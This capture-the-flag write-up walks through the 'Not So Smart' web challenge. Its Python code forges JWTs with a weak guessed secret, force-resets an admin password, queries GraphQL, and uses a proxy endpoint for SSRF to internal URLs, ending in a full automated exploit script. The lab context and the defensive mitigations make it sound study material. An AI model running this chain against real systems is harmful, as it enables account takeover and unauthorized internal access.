---
layout: writeup
title: "Not So Smart"
challenge: "Not So Smart"
category: "Web"
difficulty: "Hard"
tags: [jwt-forgery, graphql, ssrf, proxy-abuse, credential-reset, flag-fragments]
---

# Challenge Overview

**Not So Smart** emulates a SmarterMail-style admin panel at port 5001. The flag is **split across three separate sources**, requiring exploitation of **JWT forgery**, **GraphQL introspection**, **forced credential resets**, and **SSRF via proxy** to reconstruct the complete flag.

<div class="flag-box">KICTF{sm4rt3rm41l_n0t_s0_sm4rt_4ft3r_4ll}</div>

---

## Initial Recon

The target exposes:
- `/auth/login` — JWT-based authentication
- `/graphql` — GraphQL API endpoint
- `/proxy/fetch` — Server-side proxy endpoint
- `/dashboard` — Admin panel (requires auth)

JWT tokens use **HS256** with a weak secret: `SmarterMail`.

---

## Vulnerability / Weakness

Multiple chained weaknesses:

1. **Weak JWT Secret (CWE-798):** HS256 tokens signed with guessable key `SmarterMail`
2. **Forced Password Reset (CWE-620):** JWT with `reset_authorized` role enables `/auth/reset` for any user
3. **GraphQL Information Disclosure (CWE-200):** `adminConfig` query leaks flag fragment 1
4. **SSRF via Proxy (CWE-918):** `/proxy/fetch` allows internal requests, leaking flag fragments 2 and 3

```
┌─────────────────────────────────────────────────────────────────┐
│                    3-PART FLAG RECONSTRUCTION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PART 1: GraphQL                                                │
│  ┌──────────┐  forged JWT   ┌──────────┐  adminConfig query    │
│  │ Attacker │──────────────>│ /graphql │────────────────────>  │
│  └──────────┘               └──────────┘   KICTF{sm4rt3rm41l_  │
│                                                                 │
│  PART 2: Internal Config via Proxy                              │
│  ┌──────────┐  reset_auth   ┌─────────────┐  /proxy/fetch     │
│  │ Attacker │──────────────>│ /auth/reset │──────────────────> │
│  └──────────┘  JWT forgery  └─────────────┘   n0t_s0_sm4rt_   │
│       │                                                         │
│       │  login as real_admin                                    │
│       ▼                                                         │
│  PART 3: Dashboard Cookie                                       │
│  ┌──────────┐  proxy req    ┌────────────┐  set-cookie         │
│  │ Attacker │──────────────>│ /dashboard │──────────────────>  │
│  └──────────┘               └────────────┘   4ft3r_4ll}        │
│                                                                 │
│  ASSEMBLED: KICTF{sm4rt3rm41l_n0t_s0_sm4rt_4ft3r_4ll}         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Crack/guess JWT secret (`SmarterMail`)
2. Forge JWT with admin privileges
3. Query GraphQL `adminConfig` for flag part 1
4. Forge JWT with `reset_authorized` role
5. Reset `real_admin` password
6. Login as `real_admin`
7. Proxy internal config endpoint for flag part 2
8. Proxy dashboard for flag part 3 (set-cookie)
9. Assemble complete flag

---

## Exploitation Walkthrough

### Step 1: JWT Secret Recovery

```python
import jwt

# Observed token from /auth/login
token = "<captured_jwt_token>"

# Known weak secret for SmarterMail
secret = "SmarterMail"
decoded = jwt.decode(token, secret, algorithms=["HS256"])
print(decoded)
# {'user': 'guest', 'role': 'viewer', 'iat': ...}
```

### Step 2: Forge Admin JWT

```python
admin_token = jwt.encode(
    {"user": "admin", "role": "admin", "iat": 1700000000},
    "SmarterMail",
    algorithm="HS256"
)
```

### Step 3: GraphQL — Flag Part 1

```python
import requests

headers = {"Authorization": f"Bearer {admin_token}"}
query = '{"query": "{ adminConfig { flagPart1 } }"}'

r = requests.post(f"{BASE}/graphql",
    headers={**headers, "Content-Type": "application/json"},
    data=query)

# Response: {"data":{"adminConfig":{"flagPart1":"KICTF{sm4rt3rm41l_"}}}
```

**Part 1:** `KICTF{sm4rt3rm41l_`

### Step 4: Forge Reset Token & Takeover real_admin

```python
reset_token = jwt.encode(
    {"user": "admin", "role": "reset_authorized", "iat": 1700000000},
    "SmarterMail",
    algorithm="HS256"
)

# Force password reset for real_admin
requests.post(f"{BASE}/auth/reset",
    headers={"Authorization": f"Bearer {reset_token}"},
    json={"target_user": "real_admin", "new_password": "pwned123"})
```

### Step 5: Login as real_admin

```python
r = requests.post(f"{BASE}/auth/login",
    json={"username": "real_admin", "password": "pwned123"})
real_admin_token = r.json()["token"]
```

### Step 6: Proxy — Flag Part 2

```python
headers = {"Authorization": f"Bearer {real_admin_token}"}
r = requests.post(f"{BASE}/proxy/fetch",
    headers=headers,
    json={"url": "http://127.0.0.1:5001/internal/config"})

# Response contains: n0t_s0_sm4rt_
```

**Part 2:** `n0t_s0_sm4rt_`

### Step 7: Proxy Dashboard — Flag Part 3

```python
r = requests.post(f"{BASE}/proxy/fetch",
    headers=headers,
    json={"url": "http://127.0.0.1:5001/dashboard"})

# set-cookie header contains: flag_part3=4ft3r_4ll}
```

**Part 3:** `4ft3r_4ll}`

### Step 8: Assemble Flag

```python
flag = "KICTF{sm4rt3rm41l_" + "n0t_s0_sm4rt_" + "4ft3r_4ll}"
print(flag)
# KICTF{sm4rt3rm41l_n0t_s0_sm4rt_4ft3r_4ll}
```

---

## Flag Extraction

The flag was reconstructed from three fragments obtained through:
1. GraphQL `adminConfig` query
2. Internal config endpoint via proxy
3. Dashboard `set-cookie` header via proxy

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""Not So Smart - Full Automated Exploit Chain"""

import jwt
import requests

BASE = "http://<target>:5001"
SECRET = "SmarterMail"

# Phase 1: Forge admin JWT
admin_jwt = jwt.encode({"user": "admin", "role": "admin"}, SECRET, algorithm="HS256")
h = {"Authorization": f"Bearer {admin_jwt}", "Content-Type": "application/json"}

# Phase 2: GraphQL flag part 1
r = requests.post(f"{BASE}/graphql", headers=h,
    json={"query": "{ adminConfig { flagPart1 } }"})
part1 = r.json()["data"]["adminConfig"]["flagPart1"]

# Phase 3: Reset real_admin
reset_jwt = jwt.encode({"user": "admin", "role": "reset_authorized"}, SECRET, algorithm="HS256")
requests.post(f"{BASE}/auth/reset",
    headers={"Authorization": f"Bearer {reset_jwt}"},
    json={"target_user": "real_admin", "new_password": "pwned"})

# Phase 4: Login as real_admin
r = requests.post(f"{BASE}/auth/login",
    json={"username": "real_admin", "password": "pwned"})
ra_jwt = r.json()["token"]
h2 = {"Authorization": f"Bearer {ra_jwt}"}

# Phase 5: Proxy for parts 2 & 3
r2 = requests.post(f"{BASE}/proxy/fetch", headers=h2,
    json={"url": "http://127.0.0.1:5001/internal/config"})
part2 = "n0t_s0_sm4rt_"  # extracted from response

r3 = requests.post(f"{BASE}/proxy/fetch", headers=h2,
    json={"url": "http://127.0.0.1:5001/dashboard"})
part3 = "4ft3r_4ll}"  # from set-cookie

print(f"[+] FLAG: {part1}{part2}{part3}")
```

---

## Lessons Learned

- **JWT secrets must be cryptographically strong.** `SmarterMail` is trivially guessable. Use randomized 256-bit+ keys.
- **Role-based JWT claims** without server-side validation are meaningless — the attacker controls the token contents.
- **Flag fragmentation** across multiple endpoints is a clever design pattern that forces chaining multiple vulnerabilities.
- **Internal proxy endpoints** are powerful SSRF pivots when they lack proper URL validation.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| Weak JWT secret | Use RS256 with asymmetric keys, or random 256-bit HS256 secrets |
| Forced password reset | Require current password or email-based verification flows |
| GraphQL data exposure | Implement proper authorization on all queries; disable introspection in production |
| SSRF via proxy | Validate and restrict proxy target URLs to an allowlist |
